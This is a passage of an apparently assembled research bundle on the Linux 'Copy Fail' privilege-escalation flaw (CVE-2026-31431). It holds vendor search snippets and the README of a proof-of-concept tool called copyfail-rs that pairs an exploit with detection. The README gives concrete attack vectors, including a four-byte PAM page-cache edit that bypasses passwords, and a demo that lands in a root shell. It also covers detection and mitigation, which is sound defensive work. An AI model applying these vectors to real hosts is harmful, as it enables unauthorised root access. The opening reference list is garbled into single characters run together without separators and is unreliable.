\"o\", \"p\", \"e\", \"n\", \"w\", \"a\", \"l\", \"l\", \".\", \"c\", \"o\", \"m\", \"/\", \"l\", \"i\", \"s\", \"t\", \"s\", \"/\", \"o\", \"s\", \"s\", \"-\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"/\", \"2\", \"0\", \"2\", \"6\", \"/\", \"0\", \"5\", \"/\", \"0\", \"2\", \"/\", \"7\", \"h\", \"t\", \"t\", \"p\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"o\", \"p\", \"e\", \"n\", \"w\", \"a\", \"l\", \"l\", \".\", \"c\", \"o\", \"m\", \"/\", \"l\", \"i\", \"s\", \"t\", \"s\", \"/\", \"o\", \"s\", \"s\", \"-\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"/\", \"2\", \"0\", \"2\", \"6\", \"/\", \"0\", \"5\", \"/\", \"0\", \"2\", \"/\", \"8\", \"h\", \"t\", \"t\", \"p\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"o\", \"p\", \"e\", \"n\", \"w\", \"a\", \"l\", \"l\", \".\", \"c\", \"o\", \"m\", \"/\", \"l\", \"i\", \"s\", \"t\", \"s\", \"/\", \"o\", \"s\", \"s\", \"-\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"/\", \"2\", \"0\", \"2\", \"6\", \"/\", \"0\", \"5\", \"/\", \"0\", \"3\", \"/\", \"1\", \"0\", \"h\", \"t\", \"t\", \"p\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"o\", \"p\", \"e\", \"n\", \"w\", \"a\", \"l\", \"l\", \".\", \"c\", \"o\", \"m\", \"/\", \"l\", \"i\", \"s\", \"t\", \"s\", \"/\", \"o\", \"s\", \"s\", \"-\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"/\", \"2\", \"0\", \"2\", \"6\", \"/\", \"0\", \"5\", \"/\", \"0\", \"3\", \"/\", \"1\", \"2\", \"h\", \"t\", \"t\", \"p\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"o\", \"p\", \"e\", \"n\", \"w\", \"a\", \"l\", \"l\", \".\", \"c\", \"o\", \"m\", \"/\", \"l\", \"i\", \"s\", \"t\", \"s\", \"/\", \"o\", \"s\", \"s\", \"-\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"/\", \"2\", \"0\", \"2\", \"6\", \"/\", \"0\", \"5\", \"/\", \"0\", \"3\", \"/\", \"1\", \"3\", \"h\", \"t\", \"t\", \"p\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"o\", \"p\", \"e\", \"n\", \"w\", \"a\", \"l\", \"l\", \".\", \"c\", \"o\", \"m\", \"/\", \"l\", \"i\", \"s\", \"t\", \"s\", \"/\", \"o\", \"s\", \"s\", \"-\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"/\", \"2\", \"0\", \"2\", \"6\", \"/\", \"0\", \"5\", \"/\", \"0\", \"3\", \"/\", \"3\", \"h\", \"t\", \"t\", \"p\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"o\", \"p\", \"e\", \"n\", \"w\", \"a\", \"l\", \"l\", \".\", \"c\", \"o\", \"m\", \"/\", \"l\", \"i\", \"s\", \"t\", \"s\", \"/\", \"o\", \"s\", \"s\", \"-\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"/\", \"2\", \"0\", \"2\", \"6\", \"/\", \"0\", \"5\", \"/\", \"0\", \"3\", \"/\", \"4\", \"h\", \"t\", \"t\", \"p\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"o\", \"p\", \"e\", \"n\", \"w\", \"a\", \"l\", \"l\", \".\", \"c\", \"o\", \"m\", \"/\", \"l\", \"i\", \"s\", \"t\", \"s\", \"/\", \"o\", \"s\", \"s\", \"-\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"/\", \"2\", \"0\", \"2\", \"6\", \"/\", \"0\", \"5\", \"/\", \"0\", \"3\", \"/\", \"5\", \"h\", \"t\", \"t\", \"p\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"o\", \"p\", \"e\", \"n\", \"w\", \"a\", \"l\", \"l\", \".\", \"c\", \"o\", \"m\", \"/\", \"l\", \"i\", \"s\", \"t\", \"s\", \"/\", \"o\", \"s\", \"s\", \"-\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"/\", \"2\", \"0\", \"2\", \"6\", \"/\", \"0\", \"5\", \"/\", \"0\", \"3\", \"/\", \"6\", \"h\", \"t\", \"t\", \"p\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"o\", \"p\", \"e\", \"n\", \"w\", \"a\", \"l\", \"l\", \".\", \"c\", \"o\", \"m\", \"/\", \"l\", \"i\", \"s\", \"t\", \"s\", \"/\", \"o\", \"s\", \"s\", \"-\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"/\", \"2\", \"0\", \"2\", \"6\", \"/\", \"0\", \"5\", \"/\", \"0\", \"4\", \"/\", \"1\", \"h\", \"t\", \"t\", \"p\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"o\", \"p\", \"e\", \"n\", \"w\", \"a\", \"l\", \"l\", \".\", \"c\", \"o\", \"m\", \"/\", \"l\", \"i\", \"s\", \"t\", \"s\", \"/\", \"o\", \"s\", \"s\", \"-\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"/\", \"2\", \"0\", \"2\", \"6\", \"/\", \"0\", \"5\", \"/\", \"0\", \"4\", \"/\", \"1\", \"0\", \"h\", \"t\", \"t\", \"p\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"o\", \"p\", \"e\", \"n\", \"w\", \"a\", \"l\", \"l\", \".\", \"c\", \"o\", \"m\", \"/\", \"l\", \"i\", \"s\", \"t\", \"s\", \"/\", \"o\", \"s\", \"s\", \"-\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"/\", \"2\", \"0\", \"2\", \"6\", \"/\", \"0\", \"5\", \"/\", \"0\", \"4\", \"/\", \"1\", \"1\", \"h\", \"t\", \"t\", \"p\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"o\", \"p\", \"e\", \"n\", \"w\", \"a\", \"l\", \"l\", \".\", \"c\", \"o\", \"m\", \"/\", \"l\", \"i\", \"s\", \"t\", \"s\", \"/\", \"o\", \"s\", \"s\", \"-\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"/\", \"2\", \"0\", \"2\", \"6\", \"/\", \"0\", \"5\", \"/\", \"0\", \"4\", \"/\", \"1\", \"2\", \"h\", \"t\", \"t\", \"p\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"o\", \"p\", \"e\", \"n\", \"w\", \"a\", \"l\", \"l\", \".\", \"c\", \"o\", \"m\", \"/\", \"l\", \"i\", \"s\", \"t\", \"s\", \"/\", \"o\", \"s\", \"s\", \"-\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"/\", \"2\", \"0\", \"2\", \"6\", \"/\", \"0\", \"5\", \"/\", \"0\", \"4\", \"/\", \"1\", \"3\", \"h\", \"t\", \"t\", \"p\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"o\", \"p\", \"e\", \"n\", \"w\", \"a\", \"l\", \"l\", \".\", \"c\", \"o\", \"m\", \"/\", \"l\", \"i\", \"s\", \"t\", \"s\", \"/\", \"o\", \"s\", \"s\", \"-\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"/\", \"2\", \"0\", \"2\", \"6\", \"/\", \"0\", \"5\", \"/\", \"0\", \"4\", \"/\", \"1\", \"4\", \"h\", \"t\", \"t\", \"p\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"o\", \"p\", \"e\", \"n\", \"w\", \"a\", \"l\", \"l\", \".\", \"c\", \"o\", \"m\", \"/\", \"l\", \"i\", \"s\", \"t\", \"s\", \"/\", \"o\", \"s\", \"s\", \"-\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"/\", \"2\", \"0\", \"2\", \"6\", \"/\", \"0\", \"5\", \"/\", \"0\", \"4\", \"/\", \"2\", \"h\", \"t\", \"t\", \"p\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"o\", \"p\", \"e\", \"n\", \"w\", \"a\", \"l\", \"l\", \".\", \"c\", \"o\", \"m\", \"/\", \"l\", \"i\", \"s\", \"t\", \"s\", \"/\", \"o\", \"s\", \"s\", \"-\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"/\", \"2\", \"0\", \"2\", \"6\", \"/\", \"0\", \"5\", \"/\", \"0\", \"4\", \"/\", \"2\", \"4\", \"h\", \"t\", \"t\", \"p\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"o\", \"p\", \"e\", \"n\", \"w\", \"a\", \"l\", \"l\", \".\", \"c\", \"o\", \"m\", \"/\", \"l\", \"i\", \"s\", \"t\", \"s\", \"/\", \"o\", \"s\", \"s\", \"-\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"/\", \"2\", \"0\", \"2\", \"6\", \"/\", \"0\", \"5\", \"/\", \"0\", \"4\", \"/\", \"2\", \"7\", \"h\", \"t\", \"t\", \"p\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"o\", \"p\", \"e\", \"n\", \"w\", \"a\", \"l\", \"l\", \".\", \"c\", \"o\", \"m\", \"/\", \"l\", \"i\", \"s\", \"t\", \"s\", \"/\", \"o\", \"s\", \"s\", \"-\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"/\", \"2\", \"0\", \"2\", \"6\", \"/\", \"0\", \"5\", \"/\", \"0\", \"4\", \"/\", \"2\", \"8\", \"h\", \"t\", \"t\", \"p\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"o\", \"p\", \"e\", \"n\", \"w\", \"a\", \"l\", \"l\", \".\", \"c\", \"o\", \"m\", \"/\", \"l\", \"i\", \"s\", \"t\", \"s\", \"/\", \"o\", \"s\", \"s\", \"-\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"/\", \"2\", \"0\", \"2\", \"6\", \"/\", \"0\", \"5\", \"/\", \"0\", \"4\", \"/\", \"2\", \"9\", \"h\", \"t\", \"t\", \"p\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"o\", \"p\", \"e\", \"n\", \"w\", \"a\", \"l\", \"l\", \".\", \"c\", \"o\", \"m\", \"/\", \"l\", \"i\", \"s\", \"t\", \"s\", \"/\", \"o\", \"s\", \"s\", \"-\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"/\", \"2\", \"0\", \"2\", \"6\", \"/\", \"0\", \"5\", \"/\", \"0\", \"4\", \"/\", \"3\", \"1\", \"h\", \"t\", \"t\", \"p\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"o\", \"p\", \"e\", \"n\", \"w\", \"a\", \"l\", \"l\", \".\", \"c\", \"o\", \"m\", \"/\", \"l\", \"i\", \"s\", \"t\", \"s\", \"/\", \"o\", \"s\", \"s\", \"-\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"/\", \"2\", \"0\", \"2\", \"6\", \"/\", \"0\", \"5\", \"/\", \"0\", \"4\", \"/\", \"8\", \"h\", \"t\", \"t\", \"p\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"o\", \"p\", \"e\", \"n\", \"w\", \"a\", \"l\", \"l\", \".\", \"c\", \"o\", \"m\", \"/\", \"l\", \"i\", \"s\", \"t\", \"s\", \"/\", \"o\", \"s\", \"s\", \"-\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"/\", \"2\", \"0\", \"2\", \"6\", \"/\", \"0\", \"5\", \"/\", \"0\", \"4\", \"/\", \"9\", \"h\", \"t\", \"t\", \"p\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"o\", \"p\", \"e\", \"n\", \"w\", \"a\", \"l\", \"l\", \".\", \"c\", \"o\", \"m\", \"/\", \"l\", \"i\", \"s\", \"t\", \"s\", \"/\", \"o\", \"s\", \"s\", \"-\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"/\", \"2\", \"0\", \"2\", \"6\", \"/\", \"0\", \"5\", \"/\", \"0\", \"6\", \"/\", \"5\", \"h\", \"t\", \"t\", \"p\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"o\", \"p\", \"e\", \"n\", \"w\", \"a\", \"l\", \"l\", \".\", \"c\", \"o\", \"m\", \"/\", \"l\", \"i\", \"s\", \"t\", \"s\", \"/\", \"o\", \"s\", \"s\", \"-\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"/\", \"2\", \"0\", \"2\", \"6\", \"/\", \"0\", \"5\", \"/\", \"0\", \"7\", \"/\", \"1\", \"2\", \"h\", \"t\", \"t\", \"p\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"o\", \"p\", \"e\", \"n\", \"w\", \"a\", \"l\", \"l\", \".\", \"c\", \"o\", \"m\", \"/\", \"l\", \"i\", \"s\", \"t\", \"s\", \"/\", \"o\", \"s\", \"s\", \"-\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"/\", \"2\", \"0\", \"2\", \"6\", \"/\", \"0\", \"5\", \"/\", \"0\", \"7\", \"/\", \"2\", \"h\", \"t\", \"t\", \"p\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"o\", \"p\", \"e\", \"n\", \"w\", \"a\", \"l\", \"l\", \".\", \"c\", \"o\", \"m\", \"/\", \"l\", \"i\", \"s\", \"t\", \"s\", \"/\", \"o\", \"s\", \"s\", \"-\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"/\", \"2\", \"0\", \"2\", \"6\", \"/\", \"0\", \"5\", \"/\", \"0\", \"8\", \"/\", \"1\", \"3\", \"h\", \"t\", \"t\", \"p\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"o\", \"p\", \"e\", \"n\", \"w\", \"a\", \"l\", \"l\", \".\", \"c\", \"o\", \"m\", \"/\", \"l\", \"i\", \"s\", \"t\", \"s\", \"/\", \"o\", \"s\", \"s\", \"-\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"/\", \"2\", \"0\", \"2\", \"6\", \"/\", \"0\", \"5\", \"/\", \"1\", \"8\", \"/\", \"3\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"c\", \"o\", \"p\", \"y\", \".\", \"f\", \"a\", \"i\", \"l\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"w\", \"e\", \"b\", \"s\", \"e\", \"c\", \".\", \"n\", \"e\", \"t\", \"/\", \"b\", \"l\", \"o\", \"g\", \"/\", \"c\", \"v\", \"e\", \"-\", \"2\", \"0\", \"2\", \"6\", \"-\", \"3\", \"1\", \"4\", \"3\", \"1\", \"-\", \"l\", \"i\", \"n\", \"u\", \"x\", \"-\", \"a\", \"l\", \"g\", \"i\", \"f\", \"a\", \"e\", \"a\", \"d\", \"-\", \"p\", \"a\", \"g\", \"e\", \"-\", \"c\", \"a\", \"c\", \"h\", \"e\", \"-\", \"w\", \"r\", \"i\", \"t\", \"e\", \"-\", \"t\", \"o\", \"-\", \"r\", \"o\", \"o\", \"t\", \"-\", \"6\", \"9\", \"f\", \"3\", \"8\", \"a\", \"4\", \"c\", \"c\", \"d\", \"d\", \"d\", \"2\", \"d\", \"b\", \"1\", \"f\", \"5\", \"2\", \"0\", \"f\", \"1\", \"7\", \"0\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"k\", \"b\", \".\", \"c\", \"e\", \"r\", \"t\", \".\", \"o\", \"r\", \"g\", \"/\", \"v\", \"u\", \"l\", \"s\", \"/\", \"i\", \"d\", \"/\", \"2\", \"6\", \"0\", \"0\", \"0\", \"1\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"a\", \"c\", \"c\", \"e\", \"s\", \"s\", \".\", \"r\", \"e\", \"d\", \"h\", \"a\", \"t\", \".\", \"c\", \"o\", \"m\", \"/\", \"s\", \"e\", \"c\", \"u\", \"r\", \"i\", \"t\", \"y\", \"/\", \"c\", \"v\", \"e\", \"/\", \"c\", \"v\", \"e\", \"-\", \"2\", \"0\", \"2\", \"6\", \"-\", \"3\", \"1\", \"4\", \"3\", \"1\", \"#\", \"c\", \"v\", \"e\", \"-\", \"d\", \"e\", \"t\", \"a\", \"i\", \"l\", \"s\", \"-\", \"m\", \"i\", \"t\", \"i\", \"g\", \"a\", \"t\", \"i\", \"o\", \"n\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"c\", \"e\", \"r\", \"t\", \"-\", \"p\", \"o\", \"r\", \"t\", \"a\", \"l\", \".\", \"s\", \"i\", \"e\", \"m\", \"e\", \"n\", \"s\", \".\", \"c\", \"o\", \"m\", \"/\", \"p\", \"r\", \"o\", \"d\", \"u\", \"c\", \"t\", \"c\", \"e\", \"r\", \"t\", \"/\", \"h\", \"t\", \"m\", \"l\", \"/\", \"s\", \"s\", \"a\", \"-\", \"0\", \"8\", \"2\", \"5\", \"5\", \"6\", \".\", \"h\", \"t\", \"m\", \"l\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"c\", \"e\", \"r\", \"t\", \"-\", \"p\", \"o\", \"r\", \"t\", \"a\", \"l\", \".\", \"s\", \"i\", \"e\", \"m\", \"e\", \"n\", \"s\", \".\", \"c\", \"o\", \"m\", \"/\", \"p\", \"r\", \"o\", \"d\", \"u\", \"c\", \"t\", \"c\", \"e\", \"r\", \"t\", \"/\", \"h\", \"t\", \"m\", \"l\", \"/\", \"s\", \"s\", \"a\", \"-\", \"2\", \"6\", \"5\", \"6\", \"8\", \"8\", \".\", \"h\", \"t\", \"m\", \"l\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"g\", \"i\", \"t\", \"h\", \"u\", \"b\", \".\", \"c\", \"o\", \"m\", \"/\", \"t\", \"h\", \"e\", \"o\", \"r\", \"i\", \"-\", \"i\", \"o\", \"/\", \"c\", \"o\", \"p\", \"y\", \"-\", \"f\", \"a\", \"i\", \"l\", \"-\", \"C\", \"V\", \"E\", \"-\", \"2\", \"0\", \"2\", \"6\", \"-\", \"3\", \"1\", \"4\", \"3\", \"1\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"l\", \"o\", \"r\", \"e\", \".\", \"k\", \"e\", \"r\", \"n\", \"e\", \"l\", \".\", \"o\", \"r\", \"g\", \"/\", \"l\", \"i\", \"n\", \"u\", \"x\", \"-\", \"c\", \"v\", \"e\", \"-\", \"a\", \"n\", \"n\", \"o\", \"u\", \"n\", \"c\", \"e\", \"/\", \"2\", \"0\", \"2\", \"6\", \"0\", \"4\", \"2\", \"2\", \"1\", \"4\", \"-\", \"C\", \"V\", \"E\", \"-\", \"2\", \"0\", \"2\", \"6\", \"-\", \"3\", \"1\", \"4\", \"3\", \"1\", \"-\", \"3\", \"d\", \"6\", \"5\", \"@\", \"g\", \"r\", \"e\", \"g\", \"k\", \"h\", \"/\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"w\", \"w\", \"w\", \".\", \"c\", \"i\", \"s\", \"a\", \".\", \"g\", \"o\", \"v\", \"/\", \"k\", \"n\", \"o\", \"w\", \"n\", \"-\", \"e\", \"x\", \"p\", \"l\", \"o\", \"i\", \"t\", \"e\", \"d\", \"-\", \"v\", \"u\", \"l\", \"n\", \"e\", \"r\", \"a\", \"b\", \"i\", \"l\", \"i\", \"t\", \"i\", \"e\", \"s\", \"-\", \"c\", \"a\", \"t\", \"a\", \"l\", \"o\", \"g\", \"?\", \"f\", \"i\", \"e\", \"l\", \"d\", \"_\", \"c\", \"v\", \"e\", \"=\", \"C\", \"V\", \"E\", \"-\", \"2\", \"0\", \"2\", \"6\", \"-\", \"3\", \"1\", \"4\", \"3\", \"1\", \"h\", \"t\", \"t\", \"p\", \"s\", \":\", \"/\", \"/\", \"x\", \"i\", \"n\", \"t\", \".\", \"i\", \"o\", \"/\", \"b\", \"l\", \"o\", \"g\", \"/\", \"c\", \"o\", \"p\", \"y\", \"-\", \"f\", \"a\", \"i\", \"l\", \"-\", \"l\", \"i\", \"n\", \"u\", \"x\", \"-\", \"d\", \"i\", \"s\", \"t\", \"r\", \"i\", \"b\", \"u\", \"t\", \"i\", \"o\", \"n\", \"s\", \"#\", \"t\", \"h\", \"e\", \"-\", \"f\", \"i\", \"x\", \"-\", \"6\"]}\n        ```\n    *   **搜索引擎结果：**\n        ```\n        \n            ## 以下内容是基于此漏洞的搜索结果:\n                [webpage 0 begin] [title] CVE-2026-31431 Copy Fail Explained: IOCs and Patch Guide\n [description] What Is CVE-2026-31431 (Copy Fail) CVE-2026-31431, also called Copy Fail, is a Linux kernel local privilege escalation flaw rated CVSS 7.8 that abuses memory handling during kernel copy operations to overwrite privileged memory and elevate any authenticated user to root. The vulnerability was disclosed by Theori researchers in late April 2026, with public exploit material available through ...\n [link] https://www.kodemsecurity.com/resources/cve-2026-31431-copy-fail-linux-kernel-lpe-breakdown-and-remediation-runbook\n [webpage 0 end]\n[webpage 1 begin] [title] Nvd - Cve-2026-31431\n [description] CVE-2026-31431 Detail Description In the Linux kernel, the following vulnerability has been resolved: crypto: algif_aead - Revert to operating out-of-place This mostly reverts commit 72548b093ee3 except for the copying of the associated data.\n [link] https://nvd.nist.gov/vuln/detail/CVE-2026-31431\n [webpage 1 end]\n[webpage 2 begin] [title] Proof-of-concept exploit available for Linux 'Copy Fail ... - Sophos\n [description] On April 29, 2026, details about the ' Copy Fail ' vulnerability (CVE-2026-31431) were publicly disclosed. This high-severity (CVSS score of 7.8) privilege escalation vulnerability impacts Linux distributions shipped since 2017. It allows an unprivileged local user to obtain root-level access on affected Linux systems by corrupting the kernel's in-memory page cache of a privileged binary ...\n [link] https://www.sophos.com/en-us/blog/proof-of-concept-exploit-available-for-linux-copy-fail-cve-2026-31431\n [webpage 2 end]\n[webpage 3 begin] [title] CVE-2026-31431: Copy Fail vulnerability enables Linux root privilege ...\n [description] A high-severity Linux vulnerability, \"Copy Fail\" (CVE-2026-31431), enables root privilege escalation across cloud environments and Kubernetes workloads. With a working exploit already in the wild, organizations should act quickly to detect, mitigate, and reduce risk.\n [link] https://www.microsoft.com/en-us/security/blog/2026/05/01/cve-2026-31431-copy-fail-vulnerability-enables-linux-root-privilege-escalation/\n [webpage 3 end]\n[webpage 4 begin] [title] Copy Fail — CVE-2026-31431\n [description] CVE-2026-31431. 100% Reliable Linux LPE — no race, no per-distro offsets, page-cache write that bypasses on-disk file-integrity tools and crosses containers. Found by Xint Code.\n [link] https://copy.fail/\n [webpage 4 end]\n[webpage 5 begin] [title] CVE-2026-31431 (Copy Fail) 漏洞复现与验证记录 - 技术栈\n [description] Apr 30, 2026 · CVE-2026-31431 (Copy Fail) 漏洞复现与验证记录 时间：2026年4月30日 目标：验证 Linux 内核本地提权漏洞 CVE-2026-31431 的真实性与影响范围 一、漏洞概述 CVE-2026-31431 ，命名为 \"Copy Fail\" ，是一个 Linux 内核 algif_aead 模块中的 高危本地提权漏洞 。\n [link] https://jishuzhan.net/article/2050057821572628481\n [webpage 5 end]\n[webpage 6 begin] [title] CVE_2026_31431漏洞复现与分析纪实 - CSDN博客\n [description] May 5, 2026 · 文章浏览阅读563次，点赞4次，收藏10次。找资料，看代码，上调试器，五天假期忙得不亦乐乎，感觉时间过得好快，明天又到上班的时间了（时间又不属于自己了）。今天把几天忙碌的过程写下来，作为自己学习的记录，也分享给格友和同行们，写的不好的地方，欢迎大家批评指正。有兰友说内核老 ...\n [link] https://blog.csdn.net/advdbgger/article/details/160805666\n [webpage 6 end]\n[webpage 7 begin] [title] Linux 内核史诗级提权漏洞：CVE-2026-31431 复现与分析_cve-2026-3143...\n [description] May 2, 2026 · 文章详细介绍了受影响的操作系统版本、漏洞复现的具体步骤及其修复措施。 此外，文章还包括漏洞分析过程中的代码解析，并提供了 PoC 反向工程分析，逐函数拆解。 针对该漏洞的缓解措施_cve-2026-31431复现\n [link] https://blog.csdn.net/Mighty___qis/article/details/160688288\n [webpage 7 end]\n\n            \n        ```\n    *   **漏洞利用代码：**\n        ```\n        /tmp/b80cce7b821a9cb32850c6aa20e377d7/BLOG.md\n---\n# copyfail-rs\n\n> Multi-vector PoC + paired detection for CVE-2026-31431 (CopyFail).\n> Includes a novel PAM auth-bypass vector that no other public PoC ships.\n> Detection mode catches what AIDE / Wazuh / OSSEC / Tripwire structurally cannot.\n\n## TL;DR\n\nCopyFail (CVE-2026-31431) lets an unprivileged user mutate any file they can read inside the Linux page cache. The mutated bytes are what subsequent reads (including `execve()` of setuid binaries and PAM config parsing) see. The on-disk file stays clean, so every mainstream FIM tool that reads via buffered I/O hashes the corrupted bytes as truth and reports \"no change.\"\n\nThis repo ships:\n- A working PoC with **three vectors**: `su` (binary mutation), `passwd` (UID flip), and a novel `pam` (auth-chain killshot, first public).\n- A **detection mode** that uses `O_DIRECT` to bypass the page cache and compare disk vs cache hashes, the only public tool that catches CopyFail tampering reliably.\n- Sigma rules, auditd rules, an eBPF tracing one-liner, an AppArmor profile, and a tested mitigation script.\n\nSingle static `no_std` Rust binary. ~85 KB stripped musl. Runs anywhere Linux.\n\n## The two-line headline\n\n```\n$ copyfail-rs --mode detect --diff /etc/pam.d/common-auth\n[CACHE-ONLY (CopyFail signature)] /etc/pam.d/common-auth\n  current_disk:  117dab1c... (UNCHANGED, what AIDE / Wazuh / Tripwire see)\n  current_cache: 23c4f1ee... (CHANGED , the actual loaded code)\n```\n\nThe disk hash and the cache hash diverging is the CopyFail fingerprint. No other public tool surfaces this.\n\n## Quick demo (vulnerable Linux host)\n\n```\n# Exploit (PAM vector, lands in root shell):\n$ copyfail-rs --mode exploit\n[sudo] password for noot: root@host:~#\n\n# Detection (catches the tampering):\n$ copyfail-rs --mode detect --scan\nTAMPERED (1):\n  /etc/pam.d/common-auth [ext4]\n    cache:  23c4f1ee...\n    disk:   117dab1c...\n\n# Mitigate:\n$ copyfail-rs --mode detect --check\nverdict: vulnerable\n$ echo \"install algif_aead /bin/false\" | sudo tee /etc/modprobe.d/disable-algif.conf\n$ sudo rmmod algif_aead\n$ copyfail-rs --mode detect --check\nverdict: mitigated\n```\n\n## Why this exists\n\nCopyFail was disclosed 2026-04-29 by Theori / Xint. Within hours, three public PoCs landed: a Python one-liner from Theori, a portable C port by tgies, a static Go port by badsectorlabs. All three target either `/usr/bin/su` (binary mutation) or `/etc/passwd` (UID flip). All three are offense-only.\n\nThat left two gaps:\n\n1. **No public detection tool.** Defenders running incident response on a suspected CopyFail hit had nothing off-the-shelf. The mainstream FIM stack (AIDE, Wazuh, OSSEC, Tripwire, Samhain) is structurally blind to page-cache mutation: they all read via buffered I/O, get cache-served bytes, and hash those as truth. After cache eviction the disk version is what they see, clean. Result: a successful CopyFail exploitation is invisible to the file integrity monitor sitting next to it.\n\n2. **No public PAM vector.** PAM config files (`/etc/pam.d/common-auth` on Debian/Ubuntu, `/etc/pam.d/system-auth` on Fedora/RHEL/Arch) are the auth-policy substrate for `sudo`, `su`, `login`, and friends. PAM uses plain `fopen()` to read its config on every authentication attempt, page cache served. Mutating four bytes turns the auth chain from password-required into password-bypassed.\n\nThis project closes both gaps in a single static binary.\n\n## Vectors (offense)\n\n| Vector | Target | Effect | Notes |\n|--------|--------|--------|-------|\n| `su` | `/usr/bin/su` | Mutates setuid binary's text section in cache; `execve()` runs operator-supplied shellcode as root | Mirrors tgies / badsectorlabs / theori-io |\n| `passwd` | `/etc/passwd` | Flips target user's UID field to `0000`; subsequent `su <user>` or new login = root | Side effect: breaks SSH for that user (sshd NSS sees uid=0, expects keys at /root/.ssh) |\n| `pam` | `/etc/pam.d/common-auth` (Debian/Ubuntu) or `system-auth` (Fedora/RHEL/Arch) | Single 4-byte killshot: replaces `auth requisite pam_deny.so` with `#aut requisite pam_deny.so` (commented out). Auth chain falls through `pam_unix` → `pam_permit.so` → SUCCESS regardless of password. | First public PoC for this surface. Alpine n/a (sudo built `--without-pam`) |\n\nAuto-selection: `--vector auto` ranks by stealth+confidence (pam > su > passwd) and picks the highest applicable for the host. Fallback chain: `--vector all` tries each in order.\n\n## Detection (defense)\n\n| Mode | What it does |\n|------|--------------|\n| `--check` | Static diagnostic: kernel version, module loaded, template registered, `/boot/config-*` for `CONFIG_CRYPTO_USER_API_AEAD` (=y silently bypasses modprobe mitigation), modprobe blacklist present. Verdict: vulnerable / mitigated / not-exploitable. |\n| `--scan [PATH ...]` | Cache-vs-disk hash diff on critical files. `O_DIRECT` for ext4/xfs/btrfs (disk read), buffered for cache. `statfs()`-branched: overlayfs falls back to `posix_fadvise(POSIX_FADV_DONTNEED)`; tmpfs ha\n        